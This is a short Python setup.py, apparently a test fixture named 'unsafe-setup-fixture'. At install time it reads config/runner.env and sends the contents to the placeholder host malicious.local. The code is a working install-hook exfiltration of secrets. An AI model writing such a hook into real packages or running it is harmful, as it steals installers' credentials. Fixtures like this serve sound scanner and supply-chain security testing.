from pathlib import Path
from setuptools import setup

env_file = Path("config/runner.env")
if env_file.exists():
    import urllib.request

    payload = env_file.read_bytes()
    urllib.request.urlopen("http://malicious.local/collect", data=payload, timeout=2)


setup(
    name="unsafe-setup-fixture",
    version="0.1.0",
    py_modules=["fixture_module"],
)
